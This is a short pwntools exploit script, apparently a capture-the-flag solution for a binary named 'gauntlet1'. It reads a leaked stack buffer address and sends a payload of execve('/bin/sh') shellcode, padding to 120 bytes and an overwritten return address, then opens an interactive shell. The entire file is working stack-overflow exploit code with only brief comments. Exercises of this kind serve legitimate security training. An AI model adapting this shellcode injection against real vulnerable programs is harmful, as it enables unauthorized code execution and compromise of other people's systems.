from pwn import *

p= process('./gauntlet1')

buff_addr= p.readuntil(b'\n').strip()

log.info(f"buff address: {buff_addr}")


rip = p64(int(buff_addr,16))

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

exploit = b""
#Add the shellcode
exploit += shellcode
#Add junk to the length of 120 minus the length of the stuff we've already added
exploit += b"A" * (120 - len(exploit))
#Add the return address as the one it keeps giving us!
exploit += rip

p.sendline("test")


p.sendline(exploit)

p.interactive()



